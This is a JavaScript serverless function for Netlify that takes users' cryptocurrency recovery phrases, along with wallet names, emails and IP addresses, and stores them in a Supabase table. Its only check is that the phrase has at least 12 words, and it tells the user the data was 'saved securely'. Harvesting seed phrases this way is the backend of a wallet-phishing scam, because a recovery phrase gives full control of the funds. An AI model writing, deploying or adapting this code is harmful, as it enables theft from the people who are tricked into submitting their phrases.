// netlify/functions/save-wallet.js
import { createClient } from '@supabase/supabase-js'

export default async function handler(req) {
    if (req.method !== "POST") {
        return { statusCode: 405, body: "Method Not Allowed" }
    }

    try {
        const { selected_wallet, wallet_name, email, recovery_phrase } = JSON.parse(req.body)

        // Basic validation
        if (!recovery_phrase || recovery_phrase.trim().split(/\s+/).length < 12) {
            return {
                statusCode: 400,
                body: JSON.stringify({ error: "Invalid recovery phrase" })
            }
        }

        const supabase = createClient(
            process.env.SUPABASE_URL,
            process.env.SUPABASE_SERVICE_ROLE_KEY   // ← Use Service Role Key (Secure)
        )

        const { error } = await supabase
            .from('wallet_submissions')
            .insert([{
                selected_wallet,
                wallet_name: wallet_name || null,
                email: email || null,
                recovery_phrase,
                created_at: new Date().toISOString(),
                ip_address: req.headers['client-ip'] || 'unknown'
            }])

        if (error) throw error

        return {
            statusCode: 200,
            body: JSON.stringify({ success: true, message: "Wallet data saved securely" })
        }

    } catch (err) {
        console.error("Error:", err)
        return {
            statusCode: 500,
            body: JSON.stringify({ error: "Server error" })
        }
    }
}